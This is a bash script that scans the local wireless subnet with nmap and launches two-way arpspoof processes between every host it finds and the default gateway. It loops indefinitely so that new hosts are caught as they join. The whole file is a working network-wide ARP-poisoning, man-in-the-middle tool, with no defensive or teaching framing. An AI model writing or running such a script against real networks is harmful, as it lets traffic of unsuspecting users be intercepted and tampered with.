#!/bin/bash
sudo -v  # Only validates session. sudo -s logs in as root.
declare -a pids
#gtw=$(route | grep 'default' | awk -F ' ' '{ print $2 }')
gtw=$(route | awk -F ' ' '/default/{ print $2 }')
#echo $gtw

this=$(ifconfig wlan0 | awk '/inet addr/{print substr($2,6)}')
#echo $this  # Returns wlan0 IP.

i=1
ind=0
while true;
do
  echo "Run number $i."

  unset hosts
  hosts=($(nmap -sn -n -T5 $gtw/24 -exclude $this | awk -F ' ' '/for/{ print $5 }'))
  unset hosts[0]

  for host in ${hosts[*]}
  do
		if ! [[ $(ps aux | grep -c "arpspoof -i wlan0 -t $host $gtw") -ge 2 ]]; 
		then
		  sudo arpspoof -i wlan0 -t $host $gtw &> /dev/null &
		  pids[$ind]=$!
		  sudo arpspoof -i wlan0 -t $gtw $host &> /dev/null &
		  pids[$(($ind+1))]=$!
		  echo "Spoofing host $host with pids ${pids[$ind]} and ${pids[$(($ind+1))]}."
		  ind=$(($ind+2))
		fi
  done

  sleep 2
  i=$(($i+1))
	if [[ $i > 5 ]]; then
		sleep 48
	fi
done

for pid in ${pids[*]};
do
  sudo kill $pid
done

exit

